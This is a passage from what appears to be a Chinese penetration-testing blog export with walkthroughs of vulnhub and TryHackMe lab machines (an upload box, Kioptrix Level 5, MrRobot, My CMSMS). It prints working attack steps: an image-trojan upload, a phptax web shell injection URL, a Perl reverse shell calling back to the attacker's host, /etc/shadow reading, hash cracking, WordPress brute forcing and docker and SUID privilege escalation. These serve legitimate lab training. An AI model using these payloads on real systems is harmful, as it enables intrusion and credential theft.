<p><img src="/picture/image-20250325105345399.png" alt="image-20250325105345399"></p>
<p><img src="/picture/image-20250325105428542.png" alt="image-20250325105428542"></p>
<p>那我们去 &#x2F;uploads 目录看看有没有上传成功？阿哲…</p>
<p><img src="/picture/image-20250325105649877.png" alt="image-20250325105649877"></p>
<p>再看看源码，发现 Hint 指向一个网址 <a href="https://github.com/fatihhcelik/Vulnerable-Machine">https://github.com/fatihhcelik/Vulnerable-Machine</a></p>
<blockquote>
<p>年代太久远了，已经是 404 了，只能去别人的 wp 里找源码了</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;div align=&quot;center&quot;&gt;</span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;</span><br><span class="line">    &lt;br&gt;</span><br><span class="line">    &lt;b&gt;Select image : &lt;/b&gt; </span><br><span class="line">    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; style=&quot;border: solid;&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; name=&quot;submit&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">// Check if image file is a actual image or fake image</span><br><span class="line">if(isset($_POST[&quot;submit&quot;])) &#123;</span><br><span class="line">	$rand_number = rand(1,100);</span><br><span class="line">	$target_dir = &quot;uploads/&quot;;</span><br><span class="line">	$target_file = $target_dir . md5(basename($_FILES[&quot;file&quot;][&quot;name&quot;].$rand_number));</span><br><span class="line">	$file_name = $target_dir . basename($_FILES[&quot;file&quot;][&quot;name&quot;]);</span><br><span class="line">	$uploadOk = 1;</span><br><span class="line">	$imageFileType = strtolower(pathinfo($file_name,PATHINFO_EXTENSION));</span><br><span class="line">	$type = $_FILES[&quot;file&quot;][&quot;type&quot;];</span><br><span class="line">	$check = getimagesize($_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line">	if($check[&quot;mime&quot;] == &quot;image/png&quot; || $check[&quot;mime&quot;] == &quot;image/gif&quot;)&#123;</span><br><span class="line">		$uploadOk = 1;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$uploadOk = 0;</span><br><span class="line">		echo &quot;:)&quot;;</span><br><span class="line">	&#125; </span><br><span class="line">  if($uploadOk == 1)&#123;</span><br><span class="line">      move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], $target_file.&quot;.&quot;.$imageFileType);</span><br><span class="line">      echo &quot;File uploaded /uploads/?&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>这段代码时 mime 类型检测和文件 md5 加密，同时不显示上传的目录</p>
<p>制作图片木马</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> php-reverse-shell.php &gt;&gt; picture.png</span><br><span class="line"><span class="built_in">mv</span> picture.png shell.php</span><br></pre></td></tr></table></figure>

<p>上传成功</p>
<p><img src="/picture/image-20250325151128807.png" alt="image-20250325151128807"></p>
<p>编写脚本生成 shell.php 的所有可能 MD5 文件名并保存在文件中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;shell.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_username_dict</span>():</span><br><span class="line">    usernames = <span class="built_in">set</span>()</span><br><span class="line">    <span class="keyword">for</span> rand_num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">101</span>):</span><br><span class="line">        combined = filename + <span class="built_in">str</span>(rand_num)</span><br><span class="line">        md5_hash = hashlib.md5(combined.encode()).hexdigest()</span><br><span class="line">        full_filename = md5_hash + <span class="string">&quot;.php&quot;</span></span><br><span class="line">        usernames.add(full_filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;dict.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> username <span class="keyword">in</span> usernames:</span><br><span class="line">            f.write(username + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Generated <span class="subst">&#123;<span class="built_in">len</span>(usernames)&#125;</span> possible filenames in &#x27;dict.txt&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    generate_username_dict()</span><br></pre></td></tr></table></figure>

<p>使用生成的字典文件爆破</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirb http://172.16.33.66:8000/uploads dict.txt</span><br></pre></td></tr></table></figure>

<p>找到上传的文件</p>
<p><img src="/picture/image-20250325162657576.png" alt="image-20250325162657576"></p>
<p>开启 nc 监听，访问上传的文件，成功 getshell 并获得 TTY shell</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250325162854964.png" alt="image-20250325162854964"></p>
<p>接下来是提权，查看有什么文件具有 SUID 权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>发现 tail 具有 SUID 权限，tail 和 cat 相似，可以读取文件内容</p>
<p><img src="/picture/image-20250325163046781.png" alt="image-20250325163046781"></p>
<p>那就直接读取 &#x2F;etc&#x2F;shadow 中的 root 的密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tail -n 100 /etc/shadow</span><br></pre></td></tr></table></figure>

<p>获得 root 密码</p>
<p><img src="/picture/image-20250325163534817.png" alt="image-20250325163534817"></p>
<p>将密码保存为 hash 文件并使用 john 破解</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vi hash</span><br><span class="line">john hash </span><br></pre></td></tr></table></figure>

<p>破解成功，密码为 john</p>
<p><img src="/picture/image-20250325163843081.png" alt="image-20250325163843081"></p>
<p>直接使用 su 提权，成功</p>
<p><img src="/picture/image-20250325163931780.png" alt="image-20250325163931780"></p>
<p>这 flag 感觉不太对啊</p>
<p><img src="/picture/image-20250325164044018.png" alt="image-20250325164044018"></p>
<p>提示我们注意细节，我们还有 22 端口 SSH 服务没用到，同时 WordPress 站点有大量的 MySQL 服务也没发掘</p>
<p>查看 WordPress 配置文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/html/wp-config.php</span><br></pre></td></tr></table></figure>

<p>找到了 WordPress 账号和密码</p>
<p><img src="/picture/image-20250325164440356.png" alt="image-20250325164440356"></p>
<p>由于目标主机没有开放 3306 端口，外部访问不了，尝试在回弹的 shell 中登陆 mysql </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h db -u wordpress -p wordpress</span><br></pre></td></tr></table></figure>

<p>成功进入数据库，查看列表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; show tables;</span><br></pre></td></tr></table></figure>

<p>发现第一个列表有 SSH 关键词，能和之前我们猜想的一样</p>
<p><img src="/picture/image-20250325165014712.png" alt="image-20250325165014712"></p>
<p>尝试读取其中内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL [wordpress]&gt; select * from host_ssh_cred;</span><br></pre></td></tr></table></figure>

<p>发现账户名和密码</p>
<p><img src="/picture/image-20250325165133622.png" alt="image-20250325165133622"></p>
<p>使用 hashcat 破解加密后的密码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 e10adc3949ba59abbe56e057f20f883e /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>密码为 123456</p>
<p><img src="/picture/image-20250325165603369.png" alt="image-20250325165603369"></p>
<p>由于目标主机开放 22 端口，使用 SSH 远程登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh hummingbirdscyber@172.16.33.66</span><br></pre></td></tr></table></figure>

<p>登陆成功</p>
<p><img src="/picture/image-20250325165657237.png" alt="image-20250325165657237"></p>
<p>运行 id 命令，发现我们远程登陆的用户属于 docker 组，可以无需 <code>sudo</code> 直接操作 Docker</p>
<p><img src="/picture/image-20250325170409408.png" alt="image-20250325170409408"></p>
<p>由于需要知道使用的镜像名称执行如下命令查看，为 Ubuntu</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250325171437712.png" alt="image-20250325171437712"></p>
<p>启动一个新的 Docker 容器，将宿主机的根目录 <code>/</code> 挂载到容器内的 <code>/root</code> 目录</p>
<p>保持标准输入（STDIN）打开，允许交互操作，同时分配一个伪终端（TTY）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -v /:/root -i -t ubuntu /bin/bash</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250325170703308.png" alt="image-20250325170703308"></p>
<p>获得 flag</p>
<p><img src="/picture/image-20250325170826685.png" alt="image-20250325170826685"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 5 Walkthrough</title>
    <url>/2025/04/14/Kioptrix%20Level%205/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-5-Walkthrough"><a href="#Kioptrix-Level-5-Walkthrough" class="headerlink" title="Kioptrix Level 5 Walkthrough"></a>Kioptrix Level 5 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a></p>
<p><img src="/picture/image-20250414184141580.png" alt="image-20250414184141580"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>目标主机启动后需要输入 <code>ufs:/dev/ada0p2</code></p>
<p><img src="/picture/image-20250414183715240.png" alt="image-20250414183715240"></p>
<p>才算登陆成功</p>
<p><img src="/picture/image-20250414183846610.png" alt="image-20250414183846610"></p>
<p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250414134614134.png" alt="image-20250414134614134"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.152</span><br></pre></td></tr></table></figure>

<p>发现开放 80，8080 端口</p>
<p><img src="/picture/image-20250414134537101.png" alt="image-20250414134537101"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 80，8080 -A 192.168.186.152</span><br></pre></td></tr></table></figure>

<p>80 和 8080 端口开放的服务版本是一样的，但是 8080 端口状态码是 403 Forbidden</p>
<p><img src="/picture/image-20250414134749796.png" alt="image-20250414134749796"></p>
<p>那先来看 80 端口，或许能从中找到为什么 8080 端口是 403 状态码</p>
<p>进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.152</span><br></pre></td></tr></table></figure>

<p>看起来没有发现什么有用的东西</p>
<p><img src="/picture/image-20250414135036362.png" alt="image-20250414135036362"></p>
<p>那就直接访问页面，在源码中发现新的目录 &#x2F;pChart2.1.3&#x2F;index.php</p>
<p><img src="/picture/image-20250414135131213.png" alt="image-20250414135131213"></p>
<p>访问一下看看，发现被重定向到 &#x2F;pChart2.1.3&#x2F;examples&#x2F;index.php ，看起来 &#x2F;pChart2.1.3 是网站真正的目录，同时也暴露了该架构的版本为 2.1.3 </p>
<p><img src="/picture/image-20250414135234747.png" alt="image-20250414135234747"></p>
<p>去搜索一下对应版本是否存在漏洞，在 <a href="https://www.exploit-db.com/exploits/31173">pChart 2.1.3 - Multiple Vulnerabilities - PHP webapps Exploit</a> 中可以发现存在路径遍历漏洞</p>
<p><img src="/picture/image-20250414135622413.png" alt="image-20250414135622413"></p>
<p>利用成功，回显 &#x2F;etc&#x2F;passwd ，同时泄露操作系统版本</p>
<p><img src="/picture/image-20250414140103044.png" alt="image-20250414140103044"></p>
<p>由于是 Apache 作为 WEB 服务器，那我们可以尝试使用默认路径读取 FreeBSD 的 Apache 配置文件</p>
<p><img src="/picture/image-20250414140253529.png" alt="image-20250414140253529"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152/pChart2.1.3/examples/index.php?Action=View&amp;Script=%2f..%2f../usr/local/etc/apache22/httpd.conf</span><br></pre></td></tr></table></figure>

<p>包含成功，发现要访问 8080 需要特定的 User-Agent</p>
<p><img src="/picture/image-20250414140356111.png" alt="image-20250414140356111"></p>
<p>开启 burp 拦截，将 User-Agent 更改为 Mozilla&#x2F;4.0 ，发现 phptax 目录</p>
<p><img src="/picture/image-20250414150134654.png" alt="image-20250414150134654"></p>
<p>搜索 phptax 有关漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit phptax</span><br></pre></td></tr></table></figure>

<p>发现三个有关 payload</p>
<p><img src="/picture/image-20250414175813001.png" alt="image-20250414175813001"></p>
<p>在 中能发现漏洞利用过程，先使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$url&#125;/index.php?field=rce.php&amp;newvalue=%3C%3Fphp%20passthru(%24_GET%5Bcmd%5D)%3B%3F%3E</span><br></pre></td></tr></table></figure>

<p>在目标主机 &#x2F;tmp 目录创建 rce.php ，之后使用 cmd 参数命令执行</p>
<p><img src="/picture/image-20250414175930362.png" alt="image-20250414175930362"></p>
<p>利用成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=id</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250414183044909.png" alt="image-20250414183044909"></p>
<p>尝试反弹 shell </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.186.152:8080/phptax/data/rce.php?cmd=perl -MIO -e &#x27;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;192.168.186.141:8023&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#x27;</span><br></pre></td></tr></table></figure>

<p>成功获得回弹的 shell</p>
<p><img src="/picture/image-20250414180217399.png" alt="image-20250414180217399"></p>
<p>由于目标主机不包含 python ，不能升级 TTY shell</p>
<p>查看内核版本发现是 FreeBSD 9.0 ，存在内核提权漏洞</p>
<p><img src="/picture/image-20250414180438132.png" alt="image-20250414180438132"></p>
<p>将 exp 下载至本机，由于目标主机没有 wget 命令，但是有 nc 命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">which nc</span><br><span class="line">/usr/bin/nc</span><br></pre></td></tr></table></figure>

<p> 使用 nc 传输文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 本机</span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nc -nvlp 8888 &lt; 28718.c  </span><br><span class="line">listening on [any] 8888 ...</span><br><span class="line">connect to [192.168.186.141] from (UNKNOWN) [192.168.186.152] 41152</span><br><span class="line"></span><br><span class="line"># 目标主机</span><br><span class="line">nc -nv 192.168.186.141 8888 &gt; 28718.c</span><br><span class="line"></span><br><span class="line">ls -la</span><br><span class="line">total 128</span><br><span class="line">drwxrwxrwx   9 www  wheel    512 Apr 14 06:10 .</span><br><span class="line">drwxrwxrwx   8 www  wheel    512 Mar 28  2014 ..</span><br><span class="line">drwxrwxrwx  12 www  wheel    512 May  7  2003 1040</span><br><span class="line">-rw-r--r--   1 www  wheel   5563 Apr 14 06:09 28718.c</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchA</span><br><span class="line">drwxrwxrwx   2 www  wheel    512 May  7  2003 SchB</span><br><span class="line">drwxrwxrwx   6 www  wheel    512 May  7  2003 SchD</span><br><span class="line">drwxrwxrwx   4 www  wheel    512 May  7  2003 SchD1</span><br><span class="line">drwxrwxrwx   7 www  wheel    512 May  7  2003 W2</span><br><span class="line">drwxrwxrwx   2 www  wheel   1536 Mar 26  2014 pdf</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:34 rce.php</span><br><span class="line">-rw-r--r--   1 www  wheel     29 Apr 14 05:45 shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250414182258978.png" alt="image-20250414182258978"></p>
<p>使用目标主机自带 gcc 编译并赋予可执行权限，执行获得 root 权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc gcc 28718.c -o exp</span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250414181411716.png" alt="image-20250414181411716"></p>
<p>获得 flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -la /root</span><br><span class="line">cat /root/congrats.txt</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250414181815671.png" alt="image-20250414181815671"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>MrRobot Walkthrough</title>
    <url>/2025/04/07/MrRobot/</url>
    <content><![CDATA[<h1 id="MrRobot-Walkthrough"><a href="#MrRobot-Walkthrough" class="headerlink" title="MrRobot Walkthrough"></a>MrRobot Walkthrough</h1><h2 id="box-info"><a href="#box-info" class="headerlink" title="box info"></a>box info</h2><p>靶机地址：<a href="https://tryhackme.com/room/mrrobot">Mr Robot CTF</a></p>
<p>This is a virtual machine meant for beginners&#x2F;intermediate users. There are 3 hidden keys located on the machine, can you find them?</p>
<p><img src="/picture/image-20250317180740734.png" alt="image-20250317180740734"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>

<p>发现开放的 80 和 443 端口</p>
<p><img src="/picture/image-20250317174827626.png" alt="image-20250317174827626"></p>
<p>先来看 HTTP 和 HTTPS 服务，80 端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>

<p>未扫描出 apache 版本，暂不考虑从 apache 版本漏洞下手</p>
<p><img src="/picture/image-20250317175001101.png" alt="image-20250317175001101"></p>
<p>443 端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -p443 -A -Pn 10.10.173.41</span><br></pre></td></tr></table></figure>

<p>也未扫描出 apache 版本</p>
<p><img src="/picture/image-20250317175433693.png" alt="image-20250317175433693"></p>
<p>对 HTTP 服务进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.10.173.41/ -w /usr/share/wordlists/dirb/big.txt</span><br></pre></td></tr></table></figure>

<p>发现 robots.txt 同时还发现很多以 wp 开头的目录，猜测是 WordPress 构建的网站</p>
<p><img src="/picture/image-20250317181555893.png" alt="image-20250317181555893"></p>
<p>访问 robots.txt 发现第一个 key 同时发现隐藏目录 fsocity.dic </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">fsocity.dic</span><br><span class="line">key-1-of-3.txt</span><br></pre></td></tr></table></figure>

<p>访问 &#x2F;key-1-of-3.txt 就能得到第一个 key </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">073403c8a58a1f80d943455fb30724b9</span><br></pre></td></tr></table></figure>

<p>访问 fsocity.dic 能看到诸如 username、password 等字样，似乎是一个用户名和密码的字典</p>
<p><img src="/picture/image-20250317182225086.png" alt="image-20250317182225086"></p>
<p><img src="/picture/image-20250317182249643.png" alt="image-20250317182249643"></p>
<p>将 fsocity.dic 下载至本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.173.41/fsocity.dic</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250317183249439.png" alt="image-20250317183249439"></p>
<p>使用 ffuf 爆破后台密码：</p>
<p>使用 burp 拦截，发现 username 和 password 以 POST 方式传输，同时 Cookie 不是动态刷新，也存在用户名枚举漏洞</p>
<p><img src="/picture/image-20250317190217356.png" alt="image-20250317190217356"></p>
<p>去除 fsocity.dic 中重复字段：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sort fsocity.dic | uniq &gt; fsocity_uniq.dic</span><br></pre></td></tr></table></figure>

<p>将 request 保存为 request.txt ，使用 ffuf 爆破用户名（ fsocity_uniq.dic 字典较大，同时爆破用户名和密码要发送的数据过于巨大，大概千亿级 ）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity_uniq.dic:USER -fr &quot;Invalid username.&quot;</span><br></pre></td></tr></table></figure>

<p>发现三个用户名：</p>
<p><img src="/picture/image-20250317202629081.png" alt="image-20250317202629081"></p>
<p>继续爆破密码，先尝试 <code>Elliot</code> ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ffuf -request request.txt -w fsocity.dic:PASS -fr &quot;is incorrect.&quot;</span><br></pre></td></tr></table></figure>

<p>运气不错，密码为 <code>ER28-0652</code></p>
<p><img src="/picture/image-20250317201924308.png" alt="image-20250317201924308"></p>
<p>成功进入后台：</p>
<p><img src="/picture/image-20250317202800128.png" alt="image-20250317202800128"></p>
<p>将 php-reverse-shell.php 拷贝至工作目录，并更改 IP 和端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /usr/share/webshells/php/php-reverse-shell.php .</span><br><span class="line">vi php-reverse-shell.php</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250317203655296.png" alt="image-20250317203655296"></p>
<p>再 plugins 的 add new 处上传</p>
<p><img src="/picture/image-20250317203900422.png" alt="image-20250317203900422"></p>
<p>再 Media 处就能看到上传到 php 文件及其所在地址：</p>
<p><img src="/picture/image-20250317204004647.png" alt="image-20250317204004647"></p>
<p><img src="/picture/image-20250317204154357.png" alt="image-20250317204154357"></p>
<p>使用 nc 侦听 1234 端口，同时访问 PHP 所在网址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nvlp 1234</span><br></pre></td></tr></table></figure>

<p>成功 getshell ：</p>
<p><img src="/picture/image-20250317204533213.png" alt="image-20250317204533213"></p>
<p> 寻找 &#x2F;home 中用户的主目录，尝试寻找第二个 key</p>
<p>最终在 &#x2F;home&#x2F;robot 目录中找到第二个 key ，只能 root 用户读取的 <code>key-2-of-3.txt</code> ，同时寻找到疑似 root 密码哈希</p>
<p><img src="/picture/image-20250317205337671.png" alt="image-20250317205337671"></p>
<p>使用 hashcat 的字典模式破解密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -a 0 -m 0 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>密码为：<code>abcdefghijklmnopqrstuvwxyz</code></p>
<p><img src="/picture/image-20250317210031810.png" alt="image-20250317210031810"></p>
<p>直接登陆 robot 账户：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su robot</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250317210333682.png" alt="image-20250317210333682"></p>
<p>获得 key 2 ：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">822c73956184f694993bede3eb39f959</span><br></pre></td></tr></table></figure>

<p>接下来是提权，已知 robot 密码，确认是否有权通过 <code>sudo</code> 运行某些命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<p>没有能执行 sudo 的命令</p>
<p>查找具有 SUID 权限的文件</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/umount</span><br><span class="line">/bin/mount</span><br><span class="line">/bin/ping</span><br><span class="line">/bin/su</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/local/bin/nmap</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br><span class="line">/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper</span><br><span class="line">/usr/lib/pt_chown</span><br></pre></td></tr></table></figure>

<p>除了 nmap ，其余的 su、sudo 都需要有权通过 <code>sudo</code> 运行</p>
<p>使用 nmap 提权：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">robot@linux:/$ nmap --interactive</span><br><span class="line">nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; <span class="keyword">for</span> <span class="built_in">help</span></span><br><span class="line">nmap&gt; !sh</span><br><span class="line"><span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>切换至 &#x2F;root 目录并获得第三个 key</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line">total 32</span><br><span class="line">drwx------  3 root root 4096 Nov 13  2015 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 16  2015 ..</span><br><span class="line">-rw-------  1 root root 4058 Nov 14  2015 .bash_history</span><br><span class="line">-rw-r--r--  1 root root 3274 Sep 16  2015 .bashrc</span><br><span class="line">drwx------  2 root root 4096 Nov 13  2015 .cache</span><br><span class="line">-rw-r--r--  1 root root    0 Nov 13  2015 firstboot_done</span><br><span class="line">-r--------  1 root root   33 Nov 13  2015 key-3-of-3.txt</span><br><span class="line">-rw-r--r--  1 root root  140 Feb 20  2014 .profile</span><br><span class="line">-rw-------  1 root root 1024 Sep 16  2015 .rnd</span><br><span class="line"><span class="comment"># cat key-3-of-3.txt</span></span><br><span class="line">04787ddef27c3dee1ee161b21670b4e4</span><br></pre></td></tr></table></figure>

<h2 id="Final"><a href="#Final" class="headerlink" title="Final"></a>Final</h2><p><img src="/picture/image-20250317212119153.png" alt="image-20250317212119153"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>THM</tag>
      </tags>
  </entry>
  <entry>
    <title>My CMSMS Walkthrough</title>
    <url>/2025/03/19/MyCMSMS/</url>
    <content><![CDATA[<h1 id="My-CMSMS-Walkthrough"><a href="#My-CMSMS-Walkthrough" class="headerlink" title="My CMSMS Walkthrough"></a>My CMSMS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/my-cmsms-1,498/">My CMSMS: 1</a></p>
<p><img src="/picture/image-20250325194806444.png" alt="image-20250325194806444"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先做全端口扫描</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.103</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250318105230162.png" alt="image-20250318105230162"></p>
<p>以及应用版本发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p22,80,3306,33060 -A 172.16.33.103</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250318105330821.png" alt="image-20250318105330821"></p>
<p>仅发现了 HTTP 服务端的 CMS Made Simple ，并没有获得其他有用的信息。似乎 33036 端口枚举失败了，尝试进一步探测：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p33060 -A -T4 172.16.33.103</span><br></pre></td></tr></table></figure>

<p>好吧看来还是失败了</p>
<p><img src="/picture/image-20250318105548168.png" alt="image-20250318105548168"></p>
<p>先从 22 端口开始，尝试利用配置缺陷，以 root 身份登陆，看看有没有泄露信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.103                                       </span><br></pre></td></tr></table></figure>

<p>泄露了 HTTP 服务的 CMS：CMSMS 及作者信息</p>
<p><img src="/picture/image-20250318105716413.png" alt="image-20250318105716413"></p>
